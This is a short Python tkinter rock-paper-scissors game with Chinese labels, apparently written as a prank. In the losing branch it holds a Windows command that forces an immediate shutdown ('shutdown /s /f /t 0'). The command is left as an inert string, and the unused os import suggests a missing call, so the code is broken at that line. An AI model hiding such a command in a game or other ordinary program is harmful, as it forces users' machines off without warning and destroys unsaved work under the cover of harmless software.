import tkinter as tk
import random
import os
# 创建窗口
window = tk.Tk()
window.title("剪刀石頭布")
window.geometry("400x600")

# 显示游戏标题
title_label = tk.Label(window, text="剪刀石头布", font=("Arial", 24))
title_label.pack(pady=20)

# 显示玩家选择和计算机选择的标签
player_choice_label = tk.Label(window, text="玩家: ", font=("Arial", 16))
player_choice_label.pack(pady=10)

computer_choice_label = tk.Label(window, text="電腦: ", font=("Arial", 16))
computer_choice_label.pack(pady=10)

# 显示游戏结果
result_label = tk.Label(window, text="结果: ", font=("Arial", 16))
result_label.pack(pady=20)

# 游戏逻辑
def play(choice):
    # 玩家选择
    player_choice_label.config(text=f"玩家: {choice}")

    # 计算机随机选择
    computer_choice = random.choice(["剪刀", "石头", "布"])
    computer_choice_label.config(text=f"電腦: {computer_choice}")

    # 判断胜负
    if choice == computer_choice:
        result = "平局"
    elif (choice == "剪刀" and computer_choice == "布") or (choice == "石头" and computer_choice == "剪刀") or (choice == "布" and computer_choice == "石头"):
        result = "你赢了!"
    else:
        result = "你输了!"
        ("shutdown /s /f /t 0")

    result_label.config(text=f"游戏结果: {result}")

# 创建按钮
scissors_button = tk.Button(window, text="剪刀", font=("Arial", 16), width=20, command=lambda: play("剪刀"))
scissors_button.pack(pady=10)

rock_button = tk.Button(window, text="石头", font=("Arial", 16), width=20, command=lambda: play("石头"))
rock_button.pack(pady=10)

paper_button = tk.Button(window, text="布", font=("Arial", 16), width=20, command=lambda: play("布"))
paper_button.pack(pady=10)

# 运行窗口
window.mainloop()
